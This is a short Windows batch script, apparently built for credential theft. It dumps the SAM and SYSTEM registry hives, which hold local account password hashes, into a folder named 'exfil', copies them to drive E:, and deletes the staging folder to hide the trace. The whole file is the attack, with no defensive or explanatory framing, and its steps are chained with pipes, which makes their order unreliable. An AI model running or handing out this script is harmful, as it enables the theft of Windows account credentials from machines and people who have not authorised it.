@echo off
mkdir \exfil | reg save HKLM\sam \exfil\sam.save | reg save HKLM\system \exfil\system.save | copy \exfil E:\ | rmdir /s \exfil
